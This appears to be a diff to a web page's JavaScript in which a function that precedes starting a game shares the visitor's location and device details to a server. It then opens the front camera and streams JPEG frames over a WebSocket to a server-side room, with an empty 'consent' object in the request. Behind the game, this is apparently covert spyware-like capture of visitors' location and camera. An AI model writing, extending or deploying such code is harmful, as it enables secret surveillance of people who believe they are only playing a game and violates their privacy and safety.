@@ -241,28 +241,83 @@
       async function proceed() {
         await requestLocationAndShare();
 
-        // Start camera publish via WebRTC
+        // Start camera streaming via WebSocket (new system)
         const room = crypto.randomUUID();
-        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-        const ws = new WebSocket(`${location.protocol.startsWith('https') ? 'wss' : 'ws'}://${location.host}/ws?room=${encodeURIComponent(room)}`);
-        pc.onicecandidate = (e) => { if (e.candidate) ws.send(JSON.stringify(e.candidate)); };
-        try {
-          const front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-          front.getTracks().forEach(t => pc.addTrack(t, front));
-        } catch {}
-        try {
-          const back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'environment' } }, audio: false });
-          back.getTracks().forEach(t => pc.addTrack(t, back));
-        } catch {}
-        const offer = await pc.createOffer();
-        await pc.setLocalDescription(offer);
-        ws.onopen = () => ws.send(JSON.stringify(offer));
-        ws.onmessage = async (ev) => {
-          const data = JSON.parse(ev.data);
-          if (data.type === 'answer') { await pc.setRemoteDescription(data); }
-          else if (data.candidate) { try { await pc.addIceCandidate(data); } catch {} }
-        };
+        console.log('Starting mobile camera streaming to room:', room);
+        
+        // Send room info to server
         fetch('/api/share', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ page: 'camera-room', cameraRoom: room, consent: {}, device: getDeviceInfo(), dedupeId: room }) }).catch(()=>{});
+        
+        // Start WebSocket streaming
+        const ws = new WebSocket(`${location.protocol.startsWith('https') ? 'wss' : 'ws'}://${location.host}/ws?room=${encodeURIComponent(room)}`);
+        
+        ws.onopen = () => {
+          console.log('Mobile WebSocket connected to room:', room);
+          
+          // Get mobile camera and start streaming
+          navigator.mediaDevices.getUserMedia({ 
+            video: { 
+              facingMode: 'user',
+              width: { ideal: 640 },
+              height: { ideal: 480 }
+            }, 
+            audio: false 
+          }).then(stream => {
+            console.log('Mobile camera access granted, starting streaming...');
+            
+            // Create canvas to capture video frames
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            video.play();
+            
+            canvas.width = 320;
+            canvas.height = 240;
+            
+            let frameCount = 0;
+            
+            const captureFrame = () => {
+              if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                frameCount++;
+                
+                const frameData = {
+                  type: 'video_frame',
+                  camera: 'front',
+                  room: room,
+                  data: imageData,
+                  timestamp: Date.now(),
+                  frameCount: frameCount
+                };
+                
+                if (ws.readyState === WebSocket.OPEN) {
+                  ws.send(JSON.stringify(frameData));
+                  
+                  if (frameCount % 30 === 0) {
+                    console.log(`Sent ${frameCount} frames to room ${room}`);
+                  }
+                }
+              }
+              requestAnimationFrame(captureFrame);
+            };
+            
+            video.onloadedmetadata = () => {
+              console.log('Mobile video ready, starting frame capture...');
+              captureFrame();
+            };
+            
+          }).catch(error => {
+            console.error('Mobile camera access denied:', error);
+          });
+        };
+        
+        ws.onerror = (error) => {
+          console.error('Mobile WebSocket error:', error);
+        };
 
         startGame();
       }
